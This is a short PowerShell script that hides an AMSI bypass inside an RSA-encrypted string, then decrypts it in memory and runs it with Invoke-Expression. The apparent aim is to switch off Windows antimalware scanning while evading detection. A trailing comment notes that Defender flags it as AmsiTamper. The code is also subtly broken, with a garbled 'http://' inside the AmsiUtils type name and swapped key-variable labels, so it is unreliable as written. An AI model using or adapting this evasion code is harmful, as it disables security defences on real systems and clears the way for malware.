#Generate RSA key pair
$RSA = New-Object System.Security.Cryptography.RSACryptoServiceProvider

# Get the public and private key for encryption and decryption
$PublicKey = $RSA.ExportParameters( $True )
$PrivateKey = $RSA.ExportParameters( $False )

# Encode the script using RSA
$script = "[Ref].Assembly.GetType('http://System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
$encodedScript = [System.Text.Encoding]::Unicode.GetBytes($script)
$encryptedScript = $RSA.Encrypt($encodedScript, $True)

# Decode the script in memory
$decryptedScript = $RSA.Decrypt($encryptedScript, $True)
$decodedScript = [System.Text.Encoding]::Unicode.GetString($decryptedScript)

# To run the decoded script in memory, you can use the Invoke-Expression cmdlet
Invoke-Expression $decodedScript


#Detection : Trojan:Win32/AmsiTamper.A!ams
